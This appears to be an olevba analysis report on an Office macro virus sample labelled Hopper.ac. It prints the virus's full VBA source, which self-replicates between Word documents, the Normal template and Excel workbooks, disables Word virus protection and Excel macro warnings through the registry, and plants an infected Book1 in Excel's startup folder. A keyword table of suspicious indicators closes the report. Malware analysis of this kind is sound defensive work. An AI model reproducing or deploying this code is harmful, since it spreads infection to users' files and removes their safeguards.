olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.ac-33a7e3083672efbac5635a7c6f75d804b4df98a0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hopper.ac-33a7e3083672efbac5635a7c6f75d804b4df98a0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--BEAT,V1.0-->
'2000-4
Private Sub autoexec()
    SaveAsMyFile "A:", Application.Path
    InfectWordAndExcel
End Sub
Private Sub AutoOpen()
    SaveAsMyFile "A:", Application.Path
    InfectWordAndExcel
End Sub
Private Sub Document_Close()
    SaveAsMyFile "A:", Application.Path
    InfectWordAndExcel
End Sub
Private Sub Workbook_Deactivate()
    InfectWordAndExcel
End Sub

Private Sub InfectWordAndExcel()
    On Error Resume Next
    Set WordObj = GetObject(, "Word.Application")
     If WordObj = "" Then
    Set WordObj = CreateObject("Word.Application")
        WQuit = True
    End If
    Set xlApp = GetObject(, "Excel.Application")
     If xlApp = "" Then
    Set xlApp = CreateObject("Excel.Application")
        EQuit = True
    End If
''===============================================
'''word'VirusProtection
     Set WdappOp = WordObj.Options
    With WdappOp
        .VirusProtection = False
        .ConfirmConversions = False
        .SaveNormalPrompt = False
    End With    ''
    '''excel'VirusProtection
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "0" ' = "Check"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = "0" '= ""
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "0" ' = "Whoa"
''==========================
    Set nt = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set tt = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
    Set ad = WordObj.ActiveDocument.VBProject.VBComponents(1).CodeModule
''  DoWordtoItself
If Application.Name = "Microsoft Word" Then
     If ad.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
        ad.DeleteLines 1, ad.CountOfLines
        ad.InsertLines 1, tt.Lines(1, tt.CountOfLines)
        If ad.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
            ad.InsertLines 1, nt.Lines(1, nt.CountOfLines)
        End If
    End If
     If nt.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
        nt.DeleteLines 1, nt.CountOfLines
        nt.InsertLines 1, ad.Lines(1, ad.CountOfLines)
     End If
        '-------------------
     If tt.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
        tt.DeleteLines 1, tt.CountOfLines
        tt.InsertLines 1, nt.Lines(1, nt.CountOfLines)
    End If
    ActiveDocument.Save
''    DoWordtoExcel
    '-----------
    If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) = UCase("BOOK1") Then ''×ª³É´óÐ´µÄ×Ö·û´®
            Kill xlApp.Application.StartupPath + "\Book1."
    End If
    '------------
    Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, nt.Lines(1, nt.CountOfLines)
        Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
        Book1Obj.Close
 End If ''====Word
 ''===================================================
'''Workbook_Deactivate
If Application.Name = "Microsoft Excel 8.0 ÖÐÎÄ°æ" Then
    Set AW = xlApp.ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = xlApp.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
        If AW.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
        AW.DeleteLines 1, AW.CountOfLines
        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    End If
        If TW.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
        TW.DeleteLines 1, TW.CountOfLines
        TW.InsertLines 1, AW.Lines(1, TW.CountOfLines)
    End If
    '--------------
     If nt.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
        nt.DeleteLines 1, nt.CountOfLines
        nt.InsertLines 1, TW.Lines(1, TW.CountOfLines)
     End If
     ActiveWorkbook.Save
  End If ''-----Excel-----
  '--===================================================
    Set nt = Nothing
    Set tt = Nothing
    Set ad = Nothing
    Set AW = Nothing
    Set TW = Nothing
    If WQuit = True Then WordObj.Quit
    If EQuit = True Then xlApp.Quit
''========
End Sub
Private Sub SaveAsMyFile(ByVal RecentPath As String, ByVal SaveAsMyPath As String) ''SaveAsMyPath As String
    Dim MySavedAsFile
    Dim AskPath
        On Error Resume Next
       Application.StatusBar = ""
    With ActiveDocument
           MySavedAsFile = "\" & Date & "-" & .Name
           AskPath = .Path
        If AskPath = RecentPath Then
     .SaveAs FileName:=SaveAsMyPath & MySavedAsFile, AddToRecentFiles:=False, Password:=""
      End If
    End With
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

